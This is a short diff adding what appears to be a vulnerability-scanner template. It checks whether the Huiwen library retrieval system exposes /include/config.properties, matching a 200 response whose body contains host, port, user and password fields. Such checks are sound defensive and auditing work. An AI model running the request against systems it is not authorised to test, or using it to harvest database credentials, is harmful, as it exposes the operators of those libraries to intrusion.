@@ -1,0 +1,27 @@
+id: huiwen-bibliographic-info-leak
+brief:
+    title: Huiwen library bibliographic Retrieval System - Information Exposure
+    by: SleepingBag945
+    level: high
+    about: Huiwen library bibliographic retrieval system /include/config.properties file contains sensitive information, attackers can directly access to obtain information
+    label:
+        - huiwen
+        - exposure
+        - misconfig
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/include/config.properties'
+      signs:
+        - "on": word
+          has:
+            - host=
+            - port=
+            - user=
+            - password=
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
